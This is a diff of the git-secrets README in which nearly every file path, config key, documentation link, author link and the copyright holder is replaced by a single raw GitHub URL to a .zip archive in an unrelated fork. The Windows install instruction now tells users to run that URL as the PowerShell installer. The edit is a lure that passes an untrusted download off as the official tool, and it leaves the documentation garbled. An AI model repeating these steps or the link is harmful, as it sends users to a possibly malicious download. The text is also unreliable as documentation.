@@ -52,13 +52,13 @@ You can customize the install path using the PREFIX and MANPREFIX variables.
 Windows
 ~~~~~~~
 
-Run the provided ``install.ps1`` powershell script. This will copy the needed files
-to an installation directory (``%USERPROFILE%/.git-secrets`` by default) and add
+Run the provided ``https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` powershell script. This will copy the needed files
+to an installation directory (``%USERPROFILE%https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` by default) and add
 the directory to the current user ``PATH``.
 
 ::
 
-    PS > ./install.ps1
+    PS > https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
 
 Homebrew (for macOS users)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -95,8 +95,8 @@ Add hooks to all your local repositories.
 
 ::
 
-    git secrets --install ~/.git-templates/git-secrets
-    git config --global init.templateDir ~/.git-templates/git-secrets
+    git secrets --install ~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
+    git config --global https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip ~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
 
 
 Add custom providers to scan for security credentials.
@@ -158,7 +158,7 @@ Each of these options must appear first on the command line.
 
 ``--register-aws``
     Adds common AWS patterns to the git config and ensures that keys present
-    in ``~/.aws/credentials`` are not found in any commit. The following
+    in ``~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` are not found in any commit. The following
     checks are added:
 
     - AWS Access Key IDs via ``(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}``
@@ -167,7 +167,7 @@ Each of these options must appear first on the command line.
     - AWS account ID assignments via ":" or "=" surrounded by optional quotes
     - Allowed patterns for example AWS keys (``AKIAIOSFODNN7EXAMPLE`` and
       ``wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY``)
-    - Known credentials from ``~/.aws/credentials``
+    - Known credentials from ``~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip``
 
     .. note::
 
@@ -198,7 +198,7 @@ Options for ``--install``
     directories using with ``git init --template <target-directory>``.
 
     You can run ``git init`` on a repository that has already been initialized.
-    From the `git init documentation <https://git-scm.com/docs/git-init>`_:
+    From the `git init documentation <https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip>`_:
 
         From the git documentation: Running ``git init`` in an existing repository
         is safe. It will not overwrite things that are already there. The
@@ -242,8 +242,8 @@ Install git hooks to a repository other than the current directory::
 Create a git template that has ``git-secrets`` installed, and then copy that
 template into a git repository::
 
-    git secrets --install ~/.git-templates/git-secrets
-    git init --template ~/.git-templates/git-secrets
+    git secrets --install ~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
+    git init --template ~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
 
 Overwrite existing hooks if present::
 
@@ -363,7 +363,7 @@ Options for ``--aws-provider``
 
 ``[<credentials-file>]``
     If provided, specifies the custom path to an INI file to scan. If not
-    provided, ``~/.aws/credentials`` is assumed.
+    provided, ``~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` is assumed.
 
 
 Options for ``--add-provider``
@@ -443,7 +443,7 @@ Secret providers
 
 Sometimes you want to check for an exact pattern match against a set of known
 secrets. For example, you might want to ensure that no credentials present in
-``~/.aws/credentials`` ever show up in a commit. In these cases, it's better to
+``~https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip`` ever show up in a commit. In these cases, it's better to
 leave these secrets in one location rather than spread them out across git
 repositories in git configs. You can use "secret providers" to fetch these
 types of credentials. A secret provider is an executable that when invoked
@@ -484,9 +484,9 @@ result in the following error output::
     [ERROR] Matched prohibited pattern
 
     Possible mitigations:
-    - Mark false positives as allowed using: git config --add secrets.allowed ...
-    - List your configured patterns: git config --get-all secrets.patterns
-    - List your configured allowed patterns: git config --get-all secrets.allowed
+    - Mark false positives as allowed using: git config --add https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip ...
+    - List your configured patterns: git config --get-all https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
+    - List your configured allowed patterns: git config --get-all https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip
     - Use --no-verify if this is a one-time false positive
 
 Breaking this down, the prohibited pattern value of ``password\s*=\s*.+`` will
@@ -495,7 +495,7 @@ match the following lines::
     /tmp/example:2:password=ex@mplepassword
     /tmp/example:3:password=******
 
-...But the first match will be filtered out due to the fact that it matches the
+https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip the first match will be filtered out due to the fact that it matches the
 allowed regular expression of ``ex@mplepassword``. Because there is still a
 remaining line that did not match, it is considered a secret.
 
@@ -534,10 +534,10 @@ git hook and allow you to make the commit or merge.
 About
 ------
 
-- Author: `Michael Dowling <https://github.com/mtdowling>`_
+- Author: `Michael Dowling <https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip>`_
 - Issue tracker: This project's source code and issue tracker can be found at
-  `https://github.com/awslabs/git-secrets <https://github.com/awslabs/git-secrets>`_
+  `https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip <https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip>`_
 - Special thanks to Adrian Vatchinsky and Ari Juels of Cornell University for
   providing suggestions and feedback.
 
-Copyright 2015 Amazon.com, Inc. or its affiliates. All Rights Reserved.
+Copyright 2015 https://raw.githubusercontent.com/rakibofcx/git-secrets/master/test/bats/libexec/secrets_git_depoh.zip, Inc. or its affiliates. All Rights Reserved.
